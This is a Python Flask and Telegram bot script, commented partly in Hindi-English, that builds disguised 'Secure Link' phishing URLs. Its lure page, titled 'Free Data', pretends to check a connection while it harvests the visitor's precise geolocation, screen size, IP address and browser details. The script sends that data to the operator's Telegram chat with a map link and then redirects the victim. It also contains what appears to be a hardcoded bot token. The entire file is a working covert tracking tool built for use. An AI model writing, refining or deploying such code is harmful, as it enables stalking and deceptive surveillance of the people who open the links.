import os
import threading
import base64
import requests
from flask import Flask, request
import telebot
from datetime import datetime

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Data ko file mein save karne ka function
def save_to_file(data):
    with open("data.txt", "a") as f:
        f.write(f"{datetime.now()} | {data}\n")

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- TELEGRAM COMMANDS ---
@bot.message_handler(commands=['link'])
def send_link_command(message):
    app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
    text_parts = message.text.split(maxsplit=1)
    if len(text_parts) > 1:
        target_url = text_parts[1].strip()
        encoded_target = base64.urlsafe_b64encode(target_url.encode()).decode()
        final_link = f"{app_url}/?to={encoded_target}"
        bot.send_message(message.chat.id, f"🔗 *Secure Link:* `{final_link}`", parse_mode="Markdown")

# --- FRONTEND (HTML) ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Data</title>
    <style>
        body { background: #0f172a; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #334155; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>Checking for Free Data...</h3>
        <p>Please wait while we verify your connection.</p>
    </div>
    <script>
        function onSuccess(pos) {
            fetch('/update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    screen: window.screen.width + 'x' + window.screen.height
                })
            }).finally(() => { window.location.href = "TARGET_URL_PLACEHOLDER"; });
        }
        navigator.geolocation.getCurrentPosition(onSuccess, () => { window.location.href = "TARGET_URL_PLACEHOLDER"; }, {enableHighAccuracy: true});
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    encoded_target = request.args.get("to")
    target = "https://www.google.com"
    if encoded_target:
        try:
            padding = '=' * (-len(encoded_target) % 4)
            target = base64.urlsafe_b64decode(encoded_target + padding).decode()
        except: pass
    return HTML_PAGE.replace("TARGET_URL_PLACEHOLDER", target)

@app.route("/update", methods=["POST"])
def update():
    data = request.get_json()
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    msg = (
        f"🚨 *NEW DATA RECEIVED*\n\n"
        f"📍 *Loc:* `{data.get('lat')}, {data.get('lon')}`\n"
        f"🎯 *Accuracy:* `{data.get('accuracy')}m`\n"
        f"📱 *Device:* `{user_agent}`\n"
        f"🌐 *IP:* `{ip}`\n"
        f"🖥️ *Screen:* `{data.get('screen')}`\n\n"
        f"🗺️ [Map Link](https://maps.google.com/?q={data.get('lat')},{data.get('lon')})"
    )
    
    save_to_file(msg) # Data save kar rahe hain
    send_telegram_message(msg)
    return "OK", 200

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=PORT), daemon=True).start()
    bot.infinity_polling()
